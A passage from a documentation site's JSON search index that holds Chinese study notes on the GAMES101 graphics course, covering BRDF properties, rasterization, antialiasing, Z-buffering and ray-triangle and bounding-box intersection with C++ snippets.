BRDF\u63a8\u5bfc)</p>"},{"location":"Accumulation/Games101/Materials%20and%20Appearances/#_1","title":"\u5404\u5411\u540c\u6027\u3001\u5404\u5411\u5f02\u6027","text":"<p>\u5177\u6709\u5404\u5411\u540c\u6027\u7684\u6750\u8d28\uff0c\u5176\u5fae\u5e73\u9762\u4e0a\u6cd5\u7ebf\u5206\u5e03\u8f83\u4e3a\u89c4\u5f8b\u3002</p> <p></p> <p>\u4ece BRDF \u4e0a\u8003\u8651\uff0c\u5982\u679c\u5206\u5e03\u51fd\u6570\u5728\u4e0d\u540c\u65b9\u4f4d\u89d2\u4e0a\u4e0d\u540c\uff0c\u5219\u4e3a\u5404\u5411\u5f02\u6027\uff1a</p> \\[ f_r(\\theta _i, \\phi_i; \\theta_o, \\phi _o) \\ne f_r(\\theta _i, \\phi_i -\\phi; \\theta_o, \\phi _o -\\phi)  \\] <p>\u7406\u8bba\u4e0a\uff0c\\(\\phi_o = (\\phi_i - \\pi)\\% 2\\pi\\)</p>"},{"location":"Accumulation/Games101/Materials%20and%20Appearances/#properties-of-brdfs","title":"Properties of BRDFs","text":"<ul> <li>Non-negativity \u975e\u8d1f\u6027</li> <li>Linearity \u7ebf\u6027\u6027\uff0c\u53ef\u4ee5\u5206\u522b\u8ba1\u7b97\u76f8\u52a0</li> <li>Reciprocity principle \u53ef\u9006\u6027\uff0c\u4ea4\u6362\u5165\u5c04\u65b9\u5411\u548c\u51fa\u5c04\u65b9\u5411\uff0c\u5f97\u5230\u7684 BRDF \u5b8c\u5168\u76f8\u540c</li> <li>Energy conservation \u51fa\u5c04\u7684\u80fd\u91cf\u5c0f\u4e8e\u7b49\u4e8e\u5165\u5c04\u7684\u80fd\u91cf</li> <li>Isotropic, Anisotropic </li> </ul>"},{"location":"Accumulation/Games101/Materials%20and%20Appearances/#-brdf-f_rtheta-_i-phi_i-theta_o-phi-_o-f_r-theta_i-theta_o-phi_o-phi_i","title":"- \u5982\u679c\u5404\u5411\u540c\u6027\uff0c\u53ef\u4ee5\u628a BRDF \u4ece\u56db\u7ef4\u964d\u81f3\u4e09\u7ef4 \\(f_r(\\theta _i, \\phi_i; \\theta_o, \\phi _o)= f_r (\\theta_i ,\\theta_o, \\phi_o -\\phi_i)\\)","text":""},{"location":"Accumulation/Games101/Rasterization/","title":"Rasterization","text":""},{"location":"Accumulation/Games101/Rasterization/#rasterization","title":"Rasterization","text":"<p> \u7ea6 1183 \u4e2a\u5b57  14 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <p>Quote</p> <p>\u5728\u505a\u5b8c Model,View,Projection \u7684 Transformation \u540e\uff0c\u6240\u6709\u7269\u4f53\u90fd\u4f1a\u505c\u7559\u5728 \\([-1,1]^3\\) \u5185\uff0c\u800c\u8981\u5c06\u8fd9\u4e2a\u6b63\u65b9\u4f53\u753b\u5728\u5c4f\u5e55\u5185\uff0c\u5c31\u9700\u8981\u8fdb\u884c\u5149\u6805\u5316\u3002</p>"},{"location":"Accumulation/Games101/Rasterization/#canonical-cube-to-screen","title":"Canonical Cube to Screen","text":"<p>\u5b9a\u4e49\u4e00\u4e2a\u5c4f\u5e55\u7a7a\u95f4\uff1a</p> <ul> <li>\u5c4f\u5e55\u7a7a\u95f4\u5de6\u4e0b\u89d2\u5b9a\u4e49\u4e3a\u5750\u6807\u539f\u70b9</li> <li>\u50cf\u7d20\u70b9\u7d22\u5f15\u5b9a\u4e49\u4e3a \\((x,y)\\) \u6574\u6570\u70b9\u5bf9\uff0c\u4e14\u8303\u56f4\u4e3a \\((0,0)\\ to\\ (width -1,height-1)\\)</li> <li>\u50cf\u7d20\u4e2d\u5fc3\u70b9\u4f4d\u4e8e \\((x+0.5,y+0.5)\\)</li> <li>\u5c4f\u5e55\u7684\u8986\u76d6\u8303\u56f4\u4e3a \\((0,0)\\ to\\ (width,height)\\)</li> </ul> <p>\u5173\u4e8e \\(x,y\\) \u5750\u6807\uff0c\u76f4\u63a5\u5c06\u5176\u4ece \\([-1,1]^2\\) \u62c9\u6210 \\([0,width]\\times[0,height]\\)\uff0c\u5e76\u628a\u4e2d\u5fc3\u79fb\u52a8\u81f3 \\((\\frac{width}{2},\\frac{height}{2})\\)\uff0c \u4f7f\u7528\u7684\u77e9\u9635\u4e3a\uff1a</p> \\[ M_{viewport}=\\left[\\begin{matrix}\\frac{width}{2} &amp; 0 &amp; 0 &amp; \\frac{width}{2} \\\\  0 &amp; \\frac{height}{2} &amp; 0 &amp; \\frac{height}{2} \\\\ 0 &amp; 0 &amp; 1 &amp; 0 \\\\ 0 &amp; 0 &amp; 0 &amp; 1\\end{matrix}\\right] \\]"},{"location":"Accumulation/Games101/Rasterization/#a-simple-approach-sampling","title":"A Simple Approach: Sampling","text":"<p>\u91c7\u6837\u662f\u56fe\u5f62\u5b66\u4e2d\u4e00\u4e2a\u91cd\u8981\u7684\u6982\u5ff5</p> <p>\u7ed9\u5b9a\u4e00\u4e2a\u4e09\u89d2\u5f62\uff0c\u5982\u679c\u4e00\u4e2a\u50cf\u7d20\u7684\u4e2d\u5fc3\u5728\u8be5\u4e09\u89d2\u5f62\u5185\uff0c\u5c06\u5176\u5b9a\u4e49\u4e3a 1\uff0c\u5426\u5219\u5b9a\u4e49\u4e3a 0\uff1a</p> <pre><code>for (int x = 0;x &lt; xmax; ++x)\n    for (int y = 0;y &lt; ymax; ++y)\n        image[x][y] = inside(tri, x+0.5, y+0.5);\n</code></pre> <p></p> <p>\u5c06\u70b9 \\(Q\\) \u4e0e\u4e09\u6761\u8fb9\u5206\u522b\u4f5c\u53c9\u4e58\uff0c\u6bcf\u6b21\u53c9\u4e58\u6839\u636e\u6b63\u8d1f\u6027\u80fd\u591f\u5224\u65ad\u8be5\u70b9\u4f4d\u4e8e\u8be5\u8fb9\u7684\u5de6\u4fa7\u8fd8\u662f\u53f3\u4fa7\u3002\u7ecf\u8fc7\u4e09\u6b21\u53c9\u4e58\uff0c\u5373\u53ef\u5224\u65ad\u8be5\u70b9\u662f\u5426\u4f4d\u4e8e\u4e09\u89d2\u5f62\u5185\u90e8\u3002</p> <p>\u5982\u679c\u8be5\u50cf\u7d20\u503c\u4e3a 1\uff0c\u90a3\u4e48\u5c31\u5c06\u5176\u7740\u8272\u4e3a\u8be5\u4e09\u89d2\u5f62\u7684\u989c\u8272\uff1b\u53cd\u4e4b\uff0c\u4e0d\u8fdb\u884c\u7740\u8272\u3002\u6700\u7ec8\u53ef\u4ee5\u5f97\u5230\u7c7b\u4f3c\u4e0b\u56fe\u7684\u7ed3\u679c\uff1a</p> <p></p>"},{"location":"Accumulation/Games101/Rasterization/#antialiasing","title":"Antialiasing","text":"<p>\u4e0a\u9762\u5f97\u5230\u7684\u7ed3\u679c\u6839\u672c\u4e0d\u50cf\u4e09\u89d2\u5f62\uff01\u56fe\u7247\u4e2d\u7684 Jaggies(\u952f\u9f7f) \u5728\u56fe\u5f62\u5b66\u4e2d\u4e5f\u88ab\u79f0\u4e3a Aliasing(\u8d70\u6837)\u3002</p> <p>Artifacts</p> <p>\u8868\u793a\u56fe\u5f62\u5b66\u4e2d\u4e00\u5207 Errors,Mistakes,Inaccuracies \u7b49\u4e0d\u5408\u7406\u7684\u7ed3\u679c\u3002</p> <ul> <li>Sampling Artifacts in Computer Graphics<ul> <li>Jaggies - Sampling in space</li> <li>Moire - Undesampling images</li> <li>Wagon wheel effect - Sampling in time</li> <li>[Many more]...</li> </ul> </li> </ul>"},{"location":"Accumulation/Games101/Rasterization/#blurring-pre-filtering","title":"Blurring/ Pre-Filtering","text":"<p>\u53cd\u8d70\u6837\u4e00\u4e2a\u53ef\u884c\u64cd\u4f5c\u662f\u5728\u91c7\u6837\u4e4b\u524d\u8fdb\u884c\u4e00\u4e2a\u6a21\u7cca\u5316\u5904\u7406\u3002</p> <p></p> <p>\u4efb\u4f55\u4e00\u4e2a\u51fd\u6570\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7\u5085\u91cc\u53f6\u5c55\u5f00\u53d8\u4e3a\u4e09\u89d2\u51fd\u6570\u7684\u96c6\u5408\u3002\u56e0\u6b64\uff0c\u5085\u91cc\u53f6\u53d8\u6362\u53ef\u4ee5\u5c06\u4efb\u610f\u51fd\u6570\u8f6c\u6362\u6210\u5e26\u6709\u4e0d\u540c\u9891\u7387\u7684\u4e09\u89d2\u51fd\u6570\u7684\u548c\uff0c\u5e76\u4e14\u80fd\u591f\u901a\u8fc7\u9006\u53d8\u6362\u5c06\u5176\u8f6c\u6362\u56de\u6765\u3002</p> <p></p> <p>\u5bf9\u53d8\u6362\u51fa\u7684\u4e09\u89d2\u51fd\u6570\u91c7\u6837\uff0c\u5bf9\u4e8e\u4f4e\u9891\u7387\u7684\u4e09\u89d2\u51fd\u6570\uff0c\u6211\u4eec\u5bb9\u6613\u901a\u8fc7\u91c7\u6837\u70b9\u6062\u590d\u51fa\u5176\u539f\u59cb\u4fe1\u53f7\uff1b\u5bf9\u4e8e\u9ad8\u9891\u7387\u7684\u4e09\u89d2\u51fd\u6570\uff0c\u6211\u4eec\u4e0d\u5bb9\u6613\u5c06\u5176\u6062\u590d\uff1a</p> <p></p> <p>What cause aliases???</p> <p>\u5bf9\u4e8e\u4e0b\u56fe\u84dd\u8272\u9ad8\u9891\u7387\u51fd\u6570\uff0c\u6211\u4eec\u5c06\u5176\u91c7\u6837\u70b9\u6062\u590d\u6210\u539f\u59cb\u4fe1\u53f7\uff0c\u5f97\u5230\u9ed1\u8272\u66f2\u7ebf\uff0c\u4e8c\u8005\u9891\u7387\u5b8c\u5168\u4e0d\u540c\uff0c\u4f46\u662f\u901a\u8fc7\u540c\u4e00\u4e2a\u91c7\u6837\u65b9\u6cd5\u5f97\u5230\u7684\u91c7\u6837\u7ed3\u679c\u5374\u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u8d70\u6837\u3002</p> <p></p> <p>\u56e0\u6b64\uff0c\u4ece\u9891\u7387\u89d2\u5ea6\u4e0a\u770b\uff0cFiltering\u5b9e\u73b0\u4e3a\u53bb\u9664\u4e00\u4e9b\u9891\u7387\u6bb5\u7684\u5185\u5bb9\uff1a</p> Orginal ImageHigh-pass FilterLow-pass Filter <p></p> <p></p> <p></p> <p>\u5bf9\u4e8e\u4e00\u4e2a\u56fe\u7247\uff0c\u8be5\u5904\u4eae\u5ea6\u53d8\u5316\u8d8a\u660e\u663e\uff0c\u5bf9\u5e94\u7684\u51fd\u6570\u9891\u7387\u8d8a\u9ad8\uff0c\u4ea6\u5373\u4e00\u4e2a\u8fb9\u754c\u3002\u56e0\u6b64\uff0c\u6a21\u7cca\u64cd\u4f5c\u53ef\u4ee5\u901a\u8fc7\u5377\u79ef\u6216\u5e73\u5747\u5b9e\u73b0\u3002</p> <p></p> <p>\u5377\u79ef\u5b9a\u7406\uff1a\u5728\u65f6\u57df\u4e0a\u8fdb\u884c\u5377\u79ef\u6548\u679c\u4e0a\u7b49\u540c\u4e8e\u5728\u9891\u57df\u4e0a\u4e58\u79ef\u518d\u9006\u5085\u91cc\u53f6\u53d8\u6362\u53d8\u56de\u53bb\u3002</p> <p></p> <p>\u518d\u6b21\u5728\u9891\u57df\u89d2\u5ea6\u4e0a\u770b\u5f85\u91c7\u6837\uff0c\u53ef\u4ee5\u770b\u4f5c\u662f\u5bf9\u9891\u8c31\u7684\u4e0d\u65ad\u590d\u5236\uff1a</p> <p></p> <p>\u65f6\u57df\u4e0a\u91c7\u6837\u7387\u8d8a\u9ad8\uff0c\u9891\u57df\u4e0a\u95f4\u9694\u8d8a\u5927\uff08\u4e8c\u8005\u76f8\u53cd\uff09</p> <p>\u90a3\u4e48\uff0cAliasing\u4e5f\u53ef\u4ee5\u770b\u4f5c\u662f\u590d\u5236\u7684\u9891\u8c31\u4e4b\u95f4\u51fa\u73b0\u91cd\u5408\u5bfc\u81f4\u7684\uff1a</p> <p></p> <p>\u6211\u4eec\u4e0d\u5e0c\u671b\u9891\u57df\u4e4b\u95f4\u51fa\u73b0\u91cd\u53e0\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5728\u91c7\u6837\u4e4b\u524d\u5bf9\u9891\u57df\u8fdb\u884c\u6a21\u7cca\uff08\u4f4e\u901a\u6ee4\u6ce2\uff09\uff1a</p> <p></p>"},{"location":"Accumulation/Games101/Rasterization/#practical-solution","title":"Practical solution","text":"<p>\u5bf9\u4e8e\u4efb\u4f55\u88ab\u4e09\u89d2\u5f62\u8986\u76d6\u7684\u50cf\u7d20\uff0c\u5bf9\u5176\u88ab\u8986\u76d6\u7684\u9762\u79ef\u6c42\u5e73\u5747\uff0c\u7136\u540e\u5206\u914d\u989c\u8272\uff1a</p> <p></p> <p>\u4e0d\u8fc7\u5b9e\u9645\u4e0a\u6211\u4eec\u5e76\u4e0d\u80fd\u53bb\u8ba1\u7b97\u6bcf\u4e2a\u5355\u4f4d\u50cf\u7d20\u7684\u88ab\u8986\u76d6\u7387\uff0c\u56e0\u6b64\u6211\u4eec\u91c7\u53d6 Supersampling \u63aa\u65bd\uff08MSAA\uff09</p> <p></p> <p>Supersampling\u5e76\u4e0d\u662f\u63d0\u9ad8\u91c7\u6837\u7387\uff0c\u4ec5\u7528\u4f5c\u6a21\u7cca\u64cd\u4f5c</p> <p>\u4ee5 \\(2\\times2\\) Supersampling \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u6b65\u5148\u786e\u5b9a\u6240\u6709\u91c7\u6837\u70b9\u662f\u5426\u5728\u4e09\u89d2\u5f62\u5185\u90e8\uff0c\u7b2c\u4e8c\u90e8\u6839\u636e Box \u5185\u5728\u5185\u90e8\u7684\u91c7\u6837\u70b9\u4e2a\u6570\u5bf9\u5176\u8fdb\u884c\u4e0a\u8272:</p> Step1Step2 <p></p> <p></p> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u5982\u679c\u4f7f\u7528 \\(2\\times2\\) \u7684 BOX\uff0cMSAA \u76f8\u5f53\u4e8e\u589e\u5927\u4e86 4 \u500d\u7684\u8ba1\u7b97\u91cf</p>"},{"location":"Accumulation/Games101/Rasterization/#visibility-occlusion","title":"Visibility/ Occlusion","text":"<p>\u5c06\u4e09\u7ef4\u7269\u4f53\u6620\u5c04\u5230\u4e8c\u7ef4\u4e0a\uff0c\u9700\u8981\u89e3\u51b3\u6df1\u5ea6\u51b2\u7a81\u7684\u95ee\u9898\uff0c\u6700\u7ec8\u9700\u8981\u663e\u793a\u7684\u662f\u6700\u524d\u65b9\u7684\u989c\u8272\u3002</p> <p>\u89e3\u51b3\u7684\u601d\u60f3\u4e3a Z-Buffer\uff0c\u8be5\u7b97\u6cd5\u4f7f\u7528\u4e00\u4e2a\u6df1\u5ea6\u7f13\u51b2\u533a\u6765\u5b58\u50a8\u5bf9\u5e94\u5c4f\u5e55\u4e0a\u50cf\u7d20\u7684\u989c\u8272\u503c\u3002\u5f53\u6805\u683c\u5316\u904d\u5386\u5230\u67d0\u4e00\u70b9\u65f6\uff0c\u5148\u5224\u65ad\u5176\u662f\u5426\u4f4d\u4e8e\u4e09\u89d2\u5f62\u5185\uff0c\u5982\u679c\u5728\uff0c\u5219\u518d\u5c06\u5176\u63d2\u503c\u6df1\u5ea6\u503c\uff08interpolated depth value\uff09\u4e0e\u6df1\u5ea6\u7f13\u51b2\u533a\uff08depth buffer\uff09\u4e2d\u7684\u76f8\u5e94\u503c\u6bd4\u8f83\uff0c\u5982\u679c\u524d\u70b9\u66f4\u9760\u8fd1\u76f8\u673a\uff0c\u5219\u8bbe\u7f6e\u50cf\u7d20\u989c\u8272\u5e76\u66f4\u65b0\u6df1\u5ea6\u7f13\u51b2\u533a\u3002</p> <pre><code>std::fill(depth_buf.begin(), depth_buf.end(), \n    std::numeric_limits&lt;float&gt;::infinity());\nstd::fill(frame_buf.begin(), frame_buf.end(), \n    Eigen::Vector3f{0, 0, 0});\n\nfor (each triangle T)\n    for (each sample (x,y,z) in T)\n        if (z &lt; depth_buf[x,y]) {     // closest sample so far\n            frame_buf[x,y] = rgb;     // update color\n            depth_buf[x,y] = z;       // update depth\n        } else; // do nothing, this sample is occluded\n</code></pre> <p></p>"},{"location":"Accumulation/Games101/Ray%20Tracing/","title":"Ray Tracing","text":""},{"location":"Accumulation/Games101/Ray%20Tracing/#ray-tracing","title":"Ray Tracing","text":"<p> \u7ea6 3440 \u4e2a\u5b57  121 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 19 \u5206\u949f</p> <p>Why Ray Tracing</p> <p>\u76f8\u6bd4\u4e8e\u53ea\u4f7f\u7528\u5149\u6805\u5316\uff0c\u5149\u7ebf\u8ffd\u8e2a\u8d28\u91cf\u8f83\u9ad8\uff0c\u4f46\u662f\u8fd0\u884c\u975e\u5e38\u7f13\u6162\u3002\u56e0\u6b64\uff0c\u5bf9\u4e8e\u5b9e\u65f6\u753b\u9762\u6211\u4eec\u91c7\u7528\u5149\u6805\u5316\uff0c\u5bf9\u4e8e\u79bb\u7ebf\u753b\u9762\u6211\u4eec\u4f7f\u7528\u5149\u7ebf\u8ffd\u8e2a\u3002</p>"},{"location":"Accumulation/Games101/Ray%20Tracing/#shadow-mapping","title":"Shadow Mapping","text":"<p>\u5728\u70b9\u5149\u6e90\u6761\u4ef6\u4e0b\uff0c\u5224\u65ad\u67d0\u4e00\u70b9\u4e0d\u5728\u9634\u5f71\u4e2d\u7684\u6839\u636e\u4e3a\u8be5\u70b9\u540c\u65f6\u5728\u76f8\u673a\u548c\u5149\u6e90\u7684\u89c6\u91ce\u5185\u3002</p> <ul> <li>Step1 \u4ece\u70b9\u5149\u6e90\u4f4d\u7f6e\u8fdb\u884c\u5149\u6805\u5316\u4f46\u4e0d\u8fdb\u884c\u7740\u8272\u53ca\u4e4b\u540e\u7684\u64cd\u4f5c\uff0c\u5c06\u5f97\u5230\u7684\u6df1\u5ea6\u7ed3\u679c\u8bb0\u5f55\uff1b</li> <li>Step2 \u5c06\u76f8\u673a\u89c6\u89d2\u4e2d\u7684\u67d0\u4e00\u70b9\u6295\u5f71\u56de\u5149\u6e90\u7684\u6df1\u5ea6\u56fe\u50cf\u4e2d\uff0c\u6bd4\u8f83\u8be5\u70b9\u5230\u5149\u6e90\u7684\u8ddd\u79bb\u4e0e\u8be5\u70b9\u5728\u6df1\u5ea6\u56fe\u4e2d\u8bb0\u5f55\u7684\u6df1\u5ea6\uff0c\u5982\u679c\u6df1\u5ea6\u4e00\u81f4\uff0c\u8bf4\u660e\u8be5\u70b9\u4e0d\u5728\u9634\u5f71\u4e2d\uff1b\u5426\u5219\uff0c\u5728\u9634\u5f71\u4e2d\u3002</li> </ul> <p></p> <p>\u5982\u679c\u5149\u6e90\u6709\u4e00\u5b9a\u5927\u5c0f\uff0c\u5c31\u4f1a\u5f62\u6210\u8f6f\u9634\u5f71\uff0c\u9634\u5f71\u989c\u8272\u8d8a\u6de1\uff0c\u7167\u5230\u4e0a\u9762\u7684\u5149\u8d8a\u591a\u3002</p> <p></p>"},{"location":"Accumulation/Games101/Ray%20Tracing/#whitted-style-ray-tracing","title":"Whitted-Style Ray Tracing","text":"<p>\u5728\u56fe\u5f62\u5b66\u4e2d\uff0c\u6211\u4eec\u5b9a\u4e49\u5149\u7ebf\u6709\u4ee5\u4e0b\u5c5e\u6027\uff1a</p> <ul> <li>&lt;1&gt; \u5149\u7ebf\u6cbf\u76f4\u7ebf\u4f20\u64ad</li> <li>&lt;2&gt; \u5149\u7ebf\u4e4b\u95f4\u4e0d\u53d1\u751f\u78b0\u649e</li> <li>&lt;3&gt; \u5149\u7ebf\u4ece\u5149\u6e90\u4f20\u64ad\u5230\u76f8\u673a</li> </ul> <p>\u6839\u636e\u5149\u8def\u7684\u53ef\u9006\u6027\uff0c\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe\u5149\u4ece\u6211\u4eec\u7684\u76f8\u673a\u51fa\u53d1\uff0c\u7ecf\u8fc7\u4e0d\u65ad\u6295\u5c04\u5230\u8fbe\u5149\u6e90\u3002</p> <p>\u76f8\u673a\u53d1\u51fa\u7684\u5149\u53ef\u4ee5\u7ecf\u8fc7\u591a\u6b21\u53cd\u5c04\u6216\u6298\u5c04\uff0c\u5728\u5230\u8fbe\u7684\u6bcf\u4e00\u4e2a\u70b9\u90fd\u5224\u65ad\u4e00\u6b21\u4e0e\u5149\u6e90\u7684\u8ddd\u79bb\u548c\u89d2\u5ea6\u5173\u7cfb\uff0c\u5206\u522b\u8ba1\u7b97\u7740\u8272\u503c\uff0c\u6700\u540e\u76f8\u52a0\uff1a</p> <p></p>"},{"location":"Accumulation/Games101/Ray%20Tracing/#ray-object-intersection","title":"Ray-object Intersection","text":"<p>\u5149\u7ebf\u7531\u8d77\u70b9 \\(o\\) \u548c\u4f20\u64ad\u65b9\u5411 \\(d\\) \u5b9a\u4e49\uff1a</p> \\[ r(t)=o+td,\\ 0\\le t\\lt \\infty \\] <p>\u4e00\u4e2a\u7403\u9762\u7531\u7403\u5fc3 \\(c\\) \u548c\u534a\u5f84 \\(R\\) \u5b9a\u4e49\uff1a</p> \\[ p:\\ (p-c)^2 -R^2 =0 \\] <p>\u90a3\u4e48\u5149\u7ebf\u548c\u7403\u7684\u4ea4\u70b9\u5fc5\u987b\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0a\u4e24\u4e2a\u65b9\u7a0b\uff1a</p> \\[\\begin{array}l (o+td-c)^2 -R^2=0 \\\\ at^2 +bt+c=0, where \\\\ a=d\\cdot d \\\\ b= 2(o-c)\\cdot d \\\\ c=(o-c)\\cdot (o-c)-R^2 \\end{array}\\] <p>\u5c06\u5176\u63a8\u5e7f\u5230\u4e00\u822c\u9690\u5f0f\u8868\u9762 \\(f(p)=0\\) \uff1a</p> \\[ f(o+td)=0 \\] <p>\u5f97\u5230\u7684\u6709\u6548\u89e3\u8981\u6c42\u4e3a\u5b9e\u6570\u3001\u5927\u4e8e 0</p> <p>\u5bf9\u4e8e\u663e\u5f0f\u8868\u9762\uff0c\u5982 Triangle Mesh\uff0c\u53ef\u4ee5\u5c06\u6bcf\u4e2a\u4e09\u89d2\u5f62\u90fd\u4e0e\u5149\u7ebf\u65b9\u7a0b\u4f5c\u5224\u65ad\uff0c\u4f46\u662f\u53ef\u60f3\u800c\u77e5\u8ba1\u7b97\u91cf\u662f\u975e\u5e38\u5927\u7684\u3002</p> <p>\u4e3a\u7b80\u5316\u8ba1\u7b97\uff0c\u53ef\u4ee5\u5148\u6c42\u51fa\u5149\u7ebf\u548c\u4e09\u89d2\u5f62\u5e73\u9762\u7684\u4ea4\u70b9\uff0c\u518d\u5224\u65ad\u8be5\u4ea4\u70b9\u662f\u5426\u5904\u4e8e\u4e09\u89d2\u5f62\u5185\u3002</p> <p>\u4e00\u4e2a\u5e73\u9762\u7531\u5176\u4e0a\u4e00\u70b9 \\(p'\\) \u548c\u5176\u6cd5\u7ebf \\(N\\) \u5b9a\u4e49\uff1a</p> \\[ p:\\ (p-p')\\cdot N=0\\ \\Rightarrow \\ ax+by+cz+d=0 \\] <p>\u90a3\u4e48\u5c06\u5149\u7ebf\u65b9\u7a0b\u5e26\u5165\u6c42\u4ea4\u70b9\uff1a</p> \\[ (o+td-p')\\cdot N=0 \\Rightarrow t=\\frac{(p'-o)\\cdot N}{d\\cdot N} \\] <p>\u6ce8\u610f\u8868\u8fbe\u5f0f\u4e2d\u90fd\u662f\u5411\u91cf\u70b9\u4e58</p> <p>\u800c\u5224\u65ad\u4ea4\u70b9\u662f\u5426\u5904\u4e8e\u4e09\u89d2\u5f62\u5185\u5728\u5149\u6805\u5316\u7ae0\u8282\u4e2d\u5df2\u5b66\u8fc7\uff0c\u6b64\u5904\u4e0d\u518d\u5c55\u793a\u3002\uff08\u5206\u522b\u4e8e\u4e09\u89d2\u5f62\u4e09\u6761\u8fb9\u53c9\u4e58\uff09</p> <p>Moller Trumbore Algorithm \u53ef\u4ee5\u901a\u8fc7\u91cd\u5fc3\u5750\u6807\u4e00\u6b65\u5230\u4f4d\u5224\u65ad\u4e09\u89d2\u5f62\u4e0e\u5149\u7ebf\u7684\u4ea4\u70b9\uff1a</p> \\[ \\begin{array}c O+tD=(1-b_1 -b_2)P_0 +b_1 P_1 +b_2 P_2 \\\\ \\left [ \\begin{matrix}  t \\\\ b_1 \\\\ b_2\\end{matrix}\\right ] = \\frac{1}{S_1\\cdot E_1} \\left [ \\begin{matrix} S_2 \\cdot E_2 \\\\ S_1 \\cdot S \\\\ S_2 \\cdot D \\end{matrix}\\right ] \\end{array} \\] <p>\u5176\u4e2d\uff1a</p> \\[\\begin{array}c \\overrightarrow{E_1}=P_1 -P_0 \\\\ \\overrightarrow{E_2}=P_2 -P_0 \\\\ \\overrightarrow{S} =O-P_0 \\\\ \\overrightarrow{S_1} =D\\times E_2 \\\\ \\overrightarrow{S_2} = S\\times E_1 \\end{array}\\] <p>C++ \u5b9e\u73b0\uff1a</p> <pre><code>bool rayTriangleIntersect(const Vector3f&amp; v0, const Vector3f&amp; v1, const Vector3f&amp; v2, const Vector3f&amp; orig,\n                          const Vector3f&amp; dir, float&amp; tnear, float&amp; u, float&amp; v)\n{\n    // Implement this function that tests whether the triangle\n    // that's specified bt v0, v1 and v2 intersects with the ray (whose\n    // origin is *orig* and direction is *dir*)\n    Vector3f E_1 = v1 - v0;\n    Vector3f E_2 = v2 - v0;\n    Vector3f S = orig - v0;\n    Vector3f S_1 = crossProduct(dir, E_2);\n    Vector3f S_2 = crossProduct(S, E_1);\n    float inv = 1 / dotProduct(S_1, E_1);\n    tnear = dotProduct(S_2, E_2) * inv;\n    u = dotProduct(S_1, S) * inv;\n    v = dotProduct(S_2, dir) * inv;\n    if (u &gt;= 0 &amp;&amp; v &gt;= 0 &amp;&amp; u + v &lt;= 1 &amp;&amp; tnear &gt;= 0)\n        return true;\n    return false;\n}\n</code></pre> <p>\u91cc\u9762\u7684\u70b9\u4e58\u548c\u53c9\u4e58\u662f\u81ea\u5df1\u5b9e\u73b0\u7684</p>"},{"location":"Accumulation/Games101/Ray%20Tracing/#bouding-volume","title":"Bouding Volume","text":"<p>\u4e3a\u4e86\u8fdb\u4e00\u6b65\u63d0\u5347\u5149\u7ebf\u548c\u4e09\u89d2\u5f62\u8868\u9762\u6c42\u4ea4\u7684\u901f\u5ea6\uff0c\u6211\u4eec\u5f15\u5165\u5305\u56f4\u76d2\u7684\u6982\u5ff5\uff08or \u5305\u56f4\u4f53\u79ef\uff09\uff1a\u6211\u4eec\u5c06\u4e00\u4e2a\u590d\u6742\u56fe\u5f62\u5305\u56f4\u5728\u5305\u56f4\u76d2\u5185\uff0c\u5982\u679c\u5149\u7ebf\u4e0d\u80fd\u547d\u4e2d\u5305\u56f4\u76d2\uff0c\u90a3\u5149\u7ebf\u4e5f\u4e00\u5b9a\u4e0d\u80fd\u547d\u4e2d\u76d2\u5185\u7684\u8868\u9762\u3002</p> <p>\u5728\u4e09\u7ef4\u7a7a\u95f4\u4e2d\uff0c\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u8f74\u5bf9\u9f50\u5305\u56f4\u76d2\u4f5c\u4e3a BOX\uff0c\u5b83\u901a\u5e38\u662f\u7531\u4e09\u5bf9\u5e73\u9762\u5f62\u6210\u7684\u4ea4\u96c6\uff0c\u4e14\u6bcf\u5bf9\u5e73\u9762\u90fd\u4e0e \\(XY\\) \u6216 \\(YZ\\) \u6216 \\(XZ\\) \u5e73\u9762\u5e73\u884c\u3002</p> <p></p> <p>\u6211\u4eec\u4ee5\u4e8c\u7ef4\u7684 Axis-Aligned Bounding Box \u4e3a\u4f8b\uff1a</p> <p></p> <p>\u5bf9\u6bcf\u4e00\u5bf9\u5e73\u9762\u8ba1\u7b97\u5149\u7ebf\u8fdb\u5165\u548c\u51fa\u53bb\u7684\u65f6\u95f4\uff0c\u5219\u6700\u540e\u5149\u7ebf\u5728 BOX \u5185\u7684\u65f6\u95f4\u4e3a\u65f6\u95f4\u7684\u4ea4\u96c6\u3002</p> <ul> <li>Key Ideas<ul> <li>The ray enters the box only when it enters all pairs of slabs</li> <li>The ray exits the bos only when it exists any pair of slabs</li> </ul> </li> </ul> \\[ t_{enter}=\\max \\{t_{min}\\}, t_{exit}=\\min \\{t_{max}\\} \\] <p>\u4e0d\u8fc7\u7531\u4e8e\u5149\u7ebf\u5e76\u4e0d\u662f\u4e00\u6761\u76f4\u7ebf\uff0c\u800c\u662f\u5c04\u7ebf\uff0c\u6211\u4eec\u901a\u8fc7\u5bf9\u8fdb\u5165\u548c\u79bb\u5f00\u65f6\u95f4\u7684\u6b63\u8d1f\u503c\u5224\u65ad\u5373\u53ef\u5f97\u5230\u662f\u5426\u6709\u4ea4\u70b9\uff1a</p> <ul> <li>If \\(t_{exit}\\lt 0\\)<ul> <li>\u76d2\u5b50\u5728\u5149\u7ebf\u540e\u9762 - no intersection</li> </ul> </li> <li>If \\(t_{exit} \\ge 0,t_{enter} \\lt 0\\)<ul> <li>\u5149\u7ebf\u8d77\u70b9\u5728\u76d2\u5b50\u5185\u90e8 - have intersection</li> </ul> </li> </ul> <p>\u5373\u6709\u4ea4\u70b9\u7684\u6761\u4ef6\u5f53\u4e14\u4ec5\u5f53 \\(t_{enter} \\lt t_{exit}\\ \\&amp;\\&amp;\\ t_{exit} \\ge 0\\) </p> <pre><code>/*\n\u91c7\u7528\u4e24\u4e2a\u70b9\u8868\u793a BoundingBox\uff0c\u5206\u522b\u4e3a pmin \u548c pmax\n*/\ninline bool Bounds3::IntersectP(const Ray&amp; ray, const Vector3f&amp; invDir,\n                                const std::array&lt;int, 3&gt;&amp; 